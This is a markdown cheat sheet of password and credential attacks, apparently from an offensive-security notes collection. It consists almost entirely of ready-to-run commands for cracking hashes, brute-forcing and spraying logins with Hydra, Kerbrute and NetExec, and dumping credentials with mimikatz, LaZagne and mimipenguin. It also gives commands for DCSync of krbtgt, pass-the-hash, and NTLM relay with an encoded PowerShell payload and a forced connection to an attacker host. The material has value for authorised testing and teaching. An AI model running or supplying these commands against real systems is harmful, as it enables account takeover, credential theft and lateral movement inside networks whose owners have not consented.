# Password Attacks

## Table of Contents
- [Password Cracking](#password-cracking)
  - [hashcat](#hashcat)
  - [John the Ripper](#john-the-ripper)
- [Online Attacks](#online-attacks)
  - [Hydra](#hydra)
  - [Kerbrute](#kerbrute)
- [Credential Dumping](#credential-dumping)
  - [mimikatz](#mimikatz)
  - [LaZagne](#lazagne)
  - [mimipenguin](#mimipenguin)
  - [NetExec](#netexec)
  - [pypykatz](#pypykatz)
- [Hash Extraction](#hash-extraction)
  - [fcrackzip](#fcrackzip)
  - [KeePass Database](#keepass-database)
  - [SSH Private Key Passphrase](#ssh-private-key-passphrase)
- [NTLM Attacks](#ntlm-attacks)
  - [Cracking NTLM](#cracking-ntlm)
  - [Pass the Hash](#pass-the-hash)
  - [Net-NTLMv2 Relay](#net-ntlmv2-relay)

---

## Password Cracking

### hashcat

> https://hashcat.net/wiki/doku.php?id=example_hashes

```shell
hashcat -m 0 md5_hash /PATH/TO/WORDLIST       # MD5
hashcat -m 100 sha1_hash /PATH/TO/WORDLIST    # SHA-1
hashcat -m 1400 sha256_hash /PATH/TO/WORDLIST # SHA-256
hashcat -m 1800 sha512_hash /PATH/TO/WORDLIST # SHA-512
hashcat -m 1000 ntlm_hash /PATH/TO/WORDLIST   # NTLM
hashcat -m 3200 bcrypt_hash /PATH/TO/WORDLIST # bcrypt
hashcat -m 5600 netntlmv2 /PATH/TO/WORDLIST   # NetNTLMv2
```

#### Common Hash Modes

| Mode | Hash Type |
| :--- | :--- |
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1800 | SHA-512 (Unix) |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 |
| 13100 | Kerberoast (TGS-REP) |
| 18200 | ASREPRoast |

#### Kerberoasting

```shell
hashcat -m 13100 hashes.kerberoast /PATH/TO/WORDLIST -r /usr/share/hashcat/rules/best64.rule --force
```

#### ASREPRoasting

```shell
hashcat -m 18200 hashes.asreproast /PATH/TO/WORDLIST -r /usr/share/hashcat/rules/best64.rule --force
```

#### Custom Rules

```shell
echo '$1' > custom.rule        # Append "1"
echo 'c' >> custom.rule        # Capitalize first letter
echo '$!' >> custom.rule       # Append "!"
```

```shell
hashcat -m 0 hash.txt wordlist.txt -r custom.rule
```

#### Identify Hash

```shell
hashcat --identify --user <FILE>
hashcat --example-hashes | grep -i "ntlm"
```

---

### John the Ripper

```shell
john <FILE> --wordlist=/PATH/TO/WORDLIST
john <FILE> --rules --wordlist=/PATH/TO/WORDLIST
john --show <FILE>
```

#### Hash Extraction

```shell
keepass2john database.kdbx > keepass_hash.txt
ssh2john id_rsa > ssh_hash.txt
zip2john file.zip > zip_hash.txt
rar2john file.rar > rar_hash.txt
pdf2john file.pdf > pdf_hash.txt
```

#### Crack with Format

```shell
john hash.txt --wordlist=/PATH/TO/WORDLIST --format=Raw-SHA256
john hash.txt --wordlist=/PATH/TO/WORDLIST --format=NT
```

---

## Online Attacks

### Hydra

```shell
hydra $rhost -l <USERNAME> -P /PATH/TO/WORDLIST <PROTOCOL>
hydra $rhost -L /PATH/TO/USERS -P /PATH/TO/WORDLIST <PROTOCOL>
hydra $rhost -C /PATH/TO/COMBO ftp  # user:pass combo file
```

#### HTTP POST Form

```shell
hydra $rhost -l <USERNAME> -P /PATH/TO/WORDLIST http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
hydra $rhost -l admin -P /PATH/TO/WORDLIST http-post-form "/admin.php:username=^USER^&password=^PASS^:login_error"
```

#### SSH

```shell
hydra -l <USERNAME> -P /PATH/TO/WORDLIST ssh://$rhost
hydra -L users.txt -P /PATH/TO/WORDLIST ssh://$rhost -t 4
```

#### FTP

```shell
hydra -l <USERNAME> -P /PATH/TO/WORDLIST ftp://$rhost
```

#### SMB

```shell
hydra -l <USERNAME> -P /PATH/TO/WORDLIST smb://$rhost
```

#### Proxy

```shell
export HYDRA_PROXY=connect://127.0.0.1:8080
```

---

### Kerbrute

> https://github.com/ropnop/kerbrute

#### User Enumeration

```shell
./kerbrute userenum -d $domain --dc $rhost /PATH/TO/USERNAMES
```

#### Password Spray

```shell
./kerbrute passwordspray -d $domain --dc $rhost /PATH/TO/USERNAMES <PASSWORD>
```

---

## Credential Dumping

### mimikatz

```cmd
.\mimikatz.exe
privilege::debug
```

#### Dump Credentials

```cmd
sekurlsa::logonpasswords
sekurlsa::wdigest
sekurlsa::kerberos
sekurlsa::tickets /export
```

#### SAM & LSA

```cmd
lsadump::sam
lsadump::secrets
lsadump::cache
```

#### DCSync

```cmd
lsadump::dcsync /user:<DOMAIN>\Administrator
lsadump::dcsync /user:<DOMAIN>\krbtgt
```

#### Token Manipulation

```cmd
token::elevate
token::revert
```

#### Pass the Ticket

```cmd
kerberos::ptt <TICKET>.kirbi
```

---

### LaZagne

> https://github.com/AlessandroZ/LaZagne/releases/

Credential recovery tool - retrieves passwords stored on local computer from browsers, databases, mail clients, wifi, git, SSH keys, and more.

#### Windows

```cmd
# Launch all modules
laZagne.exe all

# Launch only browser passwords
laZagne.exe browsers

# Launch specific software
laZagne.exe browsers -firefox

# Output to file
laZagne.exe all -oN
laZagne.exe all -oA -output C:\Users\test\Desktop

# Quiet mode with file output
laZagne.exe all -quiet -oA

# With known password (for domain credentials)
laZagne.exe all -password <PASSWORD>

# Verbose mode
laZagne.exe all -vv
```

#### Linux

```shell
python3 laZagne.py all
python3 laZagne.py browsers
python3 laZagne.py sysadmin
python3 laZagne.py wifi
```

#### Mac

```shell
# With password (required for most credentials)
python3 laZagne.py all --password <PASSWORD>

# Interactive mode (prompts for password)
python3 laZagne.py all -i
```

#### Supported Categories

| Category | Examples |
| :--- | :--- |
| browsers | Chrome, Firefox, Edge, Opera |
| mails | Outlook, Thunderbird |
| databases | PostgreSQL, SQLdeveloper |
| sysadmin | FileZilla, WinSCP, OpenSSH, PuTTY, KeePass config |
| wifi | Wireless network passwords |
| git | Git credentials |

---

### mimipenguin

> https://github.com/huntergregal/mimipenguin

Mimikatz-style tool for Linux - dumps cleartext credentials from memory. Requires root.

#### Usage

```shell
# Bash version
sudo ./mimipenguin.sh

# Python version
sudo python3 mimipenguin.py

# C binary (faster)
sudo ./mimipenguin
```

#### Building C Binary

```shell
make
# or static binary
make static
```

#### Supported Targets

| Target | Description |
| :--- | :--- |
| GDM | Kali/Debian desktop |
| Gnome Keyring | Ubuntu, ArchLinux desktop |
| LightDM | Ubuntu desktop |
| VSFTPd | Active FTP connections |
| Apache2 | HTTP Basic Auth sessions |
| OpenSSH | Active SSH sessions (sudo usage) |

---

### NetExec

> https://github.com/Pennyw0rth/NetExec

#### Authentication

```shell
netexec smb $rhost -u '<USERNAME>' -p '<PASSWORD>'
netexec smb $rhost -u '<USERNAME>' -H '<HASH>'
netexec winrm $rhost -u '<USERNAME>' -p '<PASSWORD>'
netexec ldap $rhost -u '<USERNAME>' -p '<PASSWORD>'
netexec mssql $rhost -u '<USERNAME>' -p '<PASSWORD>'
```

#### Null Session

```shell
netexec smb $rhost -u '' -p ''
netexec smb $rhost -u ' ' -p ' '
```

#### Password Spraying

```shell
netexec smb $rhost -u users.txt -p '<PASSWORD>' --continue-on-success
netexec smb $rhost -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

#### SAM Dump

```shell
netexec smb $rhost -u '<USERNAME>' -p '<PASSWORD>' --sam
netexec smb $rhost -u '<USERNAME>' -p '<PASSWORD>' --lsa
netexec smb $rhost -u '<USERNAME>' -p '<PASSWORD>' --ntds
```

#### Share Enumeration

```shell
netexec smb $rhost -u '<USERNAME>' -p '<PASSWORD>' --shares
netexec smb $rhost -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus
netexec smb $rhost -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus -o DOWNLOAD_FLAG=true
```

#### Command Execution

```shell
netexec smb $rhost -u '<USERNAME>' -p '<PASSWORD>' -x 'whoami'
netexec winrm $rhost -u '<USERNAME>' -p '<PASSWORD>' -X 'Get-Process'
```

#### RID Brute Force

```shell
netexec smb $rhost -u '<USERNAME>' -p '<PASSWORD>' --rid-brute
netexec smb $rhost -u '<USERNAME>' -p '<PASSWORD>' --rid-brute | grep 'SidTypeUser' | awk '{print $6}'
```

#### ASREPRoasting

```shell
netexec ldap $rhost -u '<USERNAME>' -p '<PASSWORD>' --asreproast hashes.asreproast
```

#### Kerberoasting

```shell
netexec ldap $rhost -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoasting
```

---

### pypykatz

```shell
pypykatz lsa minidump lsass.dmp
pypykatz registry --sam sam system
```

---

## Hash Extraction

### fcrackzip

```shell
fcrackzip -u -D -p /PATH/TO/WORDLIST <FILE>.zip
```

---

### KeePass Database

> Crack KeePass database master password

#### Extract Hash

```shell
keepass2john Database.kdbx > keepass.hash

# Remove filename prefix if needed
# $keepass$*... -> just the hash part
```

#### Crack with Hashcat

```shell
# Mode 13400 = KeePass 1/2 AES/Twofish
hashcat -m 13400 keepass.hash /PATH/TO/WORDLIST

# With rules
hashcat -m 13400 keepass.hash /PATH/TO/WORDLIST -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

#### Crack with John

```shell
john keepass.hash --wordlist=/PATH/TO/WORDLIST
john --show keepass.hash
```

---

### SSH Private Key Passphrase

> Crack encrypted SSH private key passphrase

#### Extract Hash

```shell
ssh2john id_rsa > ssh.hash

# Remove filename prefix if needed
# id_rsa:$sshng$... -> just $sshng$...
```

#### Custom John Rules

```shell
# Add custom rules to /etc/john/john.conf
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

#### Crack with John

```shell
# With custom rules
john --wordlist=passwords.txt --rules=sshRules ssh.hash

# Standard wordlist
john ssh.hash --wordlist=/PATH/TO/WORDLIST
john --show ssh.hash
```

#### Use Key

```shell
chmod 600 id_rsa
ssh -i id_rsa user@$rhost
```

---

### Additional Hash Extraction Tools

#### zip2john

```shell
# Extract hash from password-protected ZIP
zip2john protected.zip > zip.hash

# Crack with john
john zip.hash --wordlist=/PATH/TO/WORDLIST
john --show zip.hash
```

#### office2john (Microsoft Office Files)

```shell
# Excel, Word, PowerPoint files
office2john document.docx > office.hash
office2john spreadsheet.xlsx > office.hash

john office.hash --wordlist=/PATH/TO/WORDLIST
```

#### pdf2john

```shell
pdf2john protected.pdf > pdf.hash
john pdf.hash --wordlist=/PATH/TO/WORDLIST
```

#### rar2john

```shell
rar2john protected.rar > rar.hash
john rar.hash --wordlist=/PATH/TO/WORDLIST
```

#### 7z2john

```shell
7z2john protected.7z > 7z.hash
john 7z.hash --wordlist=/PATH/TO/WORDLIST
```

#### gpg2john (PGP Keys)

```shell
gpg2john private.key > gpg.hash
john gpg.hash --wordlist=/PATH/TO/WORDLIST
```

#### pfx2john (PKCS#12 Certificates)

```shell
pfx2john certificate.pfx > pfx.hash
john pfx.hash --wordlist=/PATH/TO/WORDLIST
```

#### keychain2john (macOS Keychain)

```shell
# Extract from macOS keychain
keychain2john login.keychain-db > keychain.hash
john keychain.hash --wordlist=/PATH/TO/WORDLIST
```

#### bitlocker2john

```shell
# Extract BitLocker recovery key hash
bitlocker2john -i /dev/sdb1 > bitlocker.hash
john bitlocker.hash --wordlist=/PATH/TO/WORDLIST
```

---

### Metadata Extraction

#### exiftool

> Extract metadata from files - can reveal usernames, software versions, etc.

```shell
# View all metadata
exiftool file.pdf
exiftool image.jpg
exiftool document.docx

# Extract specific fields
exiftool -Author -Creator -Producer file.pdf

# Recursive scan directory
exiftool -r /path/to/directory

# Output to file
exiftool -csv -r /path/to/directory > metadata.csv
```

#### strings

```shell
# Extract readable strings from binary files
strings file.exe | grep -i password
strings file.exe | grep -i user
```

---

## NTLM Attacks

### Cracking NTLM

> Crack Windows NTLM hashes from SAM/LSASS

#### Extract from Windows

```cmd
# Using mimikatz
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

#### Crack NTLM

```shell
# Mode 1000 = NTLM
hashcat -m 1000 ntlm.hash /PATH/TO/WORDLIST

# With rules
hashcat -m 1000 ntlm.hash /PATH/TO/WORDLIST -r /usr/share/hashcat/rules/best64.rule --force
```

---

### Pass the Hash

> Use NTLM hash for authentication without password

#### Impacket Tools

```shell
# PsExec
impacket-psexec Administrator@$rhost -hashes ':NTLM_HASH'

# WMIExec
impacket-wmiexec Administrator@$rhost -hashes ':NTLM_HASH'

# SMBExec
impacket-smbexec Administrator@$rhost -hashes ':NTLM_HASH'
```

#### NetExec/CrackMapExec

```shell
# Check if hash works
nxc smb $rhost -u 'Administrator' -H 'NTLM_HASH'

# Execute command
nxc smb $rhost -u 'Administrator' -H 'NTLM_HASH' -x 'whoami'
```

#### Evil-WinRM

```shell
evil-winrm -i $rhost -u 'Administrator' -H 'NTLM_HASH'
```

---

### Net-NTLMv2 Relay

> Relay captured Net-NTLMv2 authentication to another host

#### Prerequisites

- SMB signing must be disabled on target
- Captured user must have local admin on target

#### Find Targets (SMB Signing Disabled)

```shell
nxc smb $cidr --gen-relay-list targets.txt
nmap --script=smb2-security-mode -p 445 $rhost
```

#### Setup Relay Attack

```shell
# 1. Disable HTTP and SMB in Responder config
sudo nano /etc/responder/Responder.conf
# Set: SMB = Off, HTTP = Off

# 2. Start Responder
sudo responder -I eth0 -r -d -w

# 3. Start ntlmrelayx
# Dump SAM
impacket-ntlmrelayx -tf targets.txt -smb2support

# Execute command
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -e <BASE64>"

# Interactive shell
impacket-ntlmrelayx -tf targets.txt -smb2support -i
# Connect: nc 127.0.0.1 11000
```

#### Trigger Authentication

```shell
# From compromised host, force connection to attacker
dir \\$lhost\share
```

#### Crack Net-NTLMv2 (If Relay Fails)

```shell
# Mode 5600 = Net-NTLMv2
hashcat -m 5600 netntlmv2.hash /PATH/TO/WORDLIST --force
```

---

## See Also

- **[AD Exploitation](3.1.AD-Exploitation.md)** - Kerberoasting, ASREPRoasting, DCSync, Ticket Attacks
- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Pass the Hash, Pass the Ticket in action
- **[Wordlist Guide](../6.OS-Command/6.4.Wordlist-Guide.md)** - Username generation, wordlist creation
